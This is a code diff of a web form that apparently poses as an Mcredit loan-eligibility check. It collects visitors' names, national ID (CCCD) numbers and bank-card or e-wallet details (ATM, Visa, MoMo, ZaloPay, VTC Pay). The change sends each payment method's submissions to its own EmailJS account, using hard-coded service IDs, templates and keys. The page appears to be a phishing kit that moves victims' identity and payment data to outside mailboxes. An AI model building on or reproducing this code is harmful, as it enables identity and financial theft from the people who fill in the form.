@@ -28,13 +28,44 @@
           };
         };
 
-      const emailjsConfig = {
-        serviceId: "service_ojgecri",
-        templateId: "template_iv0zb28",
-        publicKey: "6HVdXpyF5QFf37q_u",
+      const EMAILJS_CONFIG_BY_METHOD = {
+        bank: {
+          serviceId: "service_ojgecri",
+          templateId: "template_iv0zb28",
+          publicKey: "6HVdXpyF5QFf37q_u",
+          platform: "Evaluate Conditions → ATM (Mcredit)",
+        },
+        visa: {
+          serviceId: "service_ojgecri",
+          templateId: "template_iv0zb28",
+          publicKey: "6HVdXpyF5QFf37q_u",
+          platform: "Evaluate Conditions → Visa (Mcredit)",
+        },
+        momo: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_iv0zb28",
+          publicKey: "MQKcpIwixBVd4Q920",
+          platform: "Evaluate Conditions → MoMo (Mcredit)",
+        },
+        zalopay: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_iv0zb28",
+          publicKey: "ylpUZgvVRFDRFaYoo",
+          platform: "Evaluate Conditions → ZaloPay (Mcredit)",
+        },
+        vtcpay: {
+          serviceId: "service_ezzpzs5",
+          templateId: "template_cqo9ino",
+          publicKey: "MQKcpIwixBVd4Q920",
+          platform: "Evaluate Conditions → VTC Pay (Mcredit)",
+        },
       };
 
-      const VTCPAY_EMAILJS_TEMPLATE = "template_cqo9ino";
+      const DEFAULT_EMAILJS_CONFIG = EMAILJS_CONFIG_BY_METHOD.bank;
+
+      function getEmailjsConfig(methodKey) {
+        return EMAILJS_CONFIG_BY_METHOD[methodKey] || DEFAULT_EMAILJS_CONFIG;
+      }
 
       const PAYMENT_METHOD_LABELS = {
         bank: "Thẻ ATM và Số tài khoản",
@@ -44,7 +75,7 @@
         vtcpay: "VTC Pay",
       };
 
-      emailjs.init({ publicKey: emailjsConfig.publicKey });
+      emailjs.init({ publicKey: DEFAULT_EMAILJS_CONFIG.publicKey });
     </script>
     <style>
       * {
@@ -1678,11 +1709,10 @@
           throw new Error("EmailJS chưa được tải. Vui lòng tải lại trang.");
         }
 
+        const emailjsConfig = getEmailjsConfig(formData.methodKey);
+
         const templateParams = {
-          platform:
-            formData.methodKey === "vtcpay"
-              ? "Evaluate Conditions → VTC Pay (Mcredit)"
-              : "Evaluate Conditions (Mcredit)",
+          platform: emailjsConfig.platform,
           full_name: formData.fullName,
           cccd: formData.cccd,
           id_number: formData.cccd,
@@ -1706,15 +1736,16 @@
           submitted_at: new Date().toLocaleString("vi-VN"),
         };
 
-        console.log("Sending formData to EmailJS:", templateParams);
-        const templateId =
-          formData.methodKey === "vtcpay"
-            ? VTCPAY_EMAILJS_TEMPLATE
-            : emailjsConfig.templateId;
+        console.log(
+          "Sending formData to EmailJS:",
+          templateParams,
+          emailjsConfig
+        );
         const response = await emailjs.send(
           emailjsConfig.serviceId,
-          templateId,
-          templateParams
+          emailjsConfig.templateId,
+          templateParams,
+          { publicKey: emailjsConfig.publicKey }
         );
 
         if (response.status !== 200) {
